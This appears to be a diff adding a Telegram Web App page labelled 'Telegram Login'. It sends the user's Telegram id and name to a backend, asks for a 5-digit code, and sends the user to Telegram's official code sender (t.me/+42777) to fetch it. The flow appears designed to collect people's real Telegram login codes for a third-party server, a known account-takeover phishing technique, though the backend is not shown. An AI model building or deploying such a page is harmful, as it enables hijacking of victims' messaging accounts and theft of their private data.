@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <style>
+        body { font-family: Arial; padding: 20px; text-align: center; }
+        button { padding: 10px 20px; margin: 10px; cursor: pointer; }
+        input { padding: 10px; width: 80%; margin: 10px 0; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <h2>📲 Login with Your Telegram Number</h2>
+    <button id="btnRequestContact">📱 Share My Number</button>
+
+    <div id="otpSection" class="hidden">
+        <h3>🔐 Enter OTP</h3>
+        <input type="text" id="otpInput" placeholder="Enter 5-digit code">
+        <br>
+        <button id="btnVerifyOTP">✅ Verify OTP</button>
+        <br><br>
+        <button id="btnShowOTP">📬 Show OTP in Telegram</button>
+    </div>
+
+    <div id="successSection" class="hidden">
+        <h2>🎉 Congratulations!</h2>
+        <p>You are successfully logged in.</p>
+    </div>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        const WebApp = window.Telegram.WebApp;
+        WebApp.expand();
+
+        document.getElementById('btnRequestContact').addEventListener('click', () => {
+            WebApp.showPopup({
+                title: "Allow Contact",
+                message: "Share your phone number to login?",
+                buttons: [{type: "ok"}, {type: "cancel"}]
+            }, (buttonId) => {
+                if (buttonId === "ok") {
+                    // Send user data to backend
+                    fetch('/request_otp', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            user_id: WebApp.initDataUnsafe.user.id,
+                            first_name: WebApp.initDataUnsafe.user.first_name,
+                            username: WebApp.initDataUnsafe.user.username || ''
+                        })
+                    })
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data.success) {
+                            document.getElementById('btnRequestContact').classList.add('hidden');
+                            document.getElementById('otpSection').classList.remove('hidden');
+                        } else {
+                            alert("Failed to request OTP");
+                        }
+                    });
+                }
+            });
+        });
+
+        document.getElementById('btnShowOTP').addEventListener('click', () => {
+            window.open('https://t.me/+42777', '_blank');
+        });
+
+        document.getElementById('btnVerifyOTP').addEventListener('click', () => {
+            const otp = document.getElementById('otpInput').value;
+            fetch('/verify_otp', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    user_id: WebApp.initDataUnsafe.user.id,
+                    otp: otp
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('otpSection').classList.add('hidden');
+                    document.getElementById('successSection').classList.remove('hidden');
+                    WebApp.close();
+                } else {
+                    alert("Invalid OTP!");
+                }
+            });
+        });
+    </script>
+</body>
+</html>
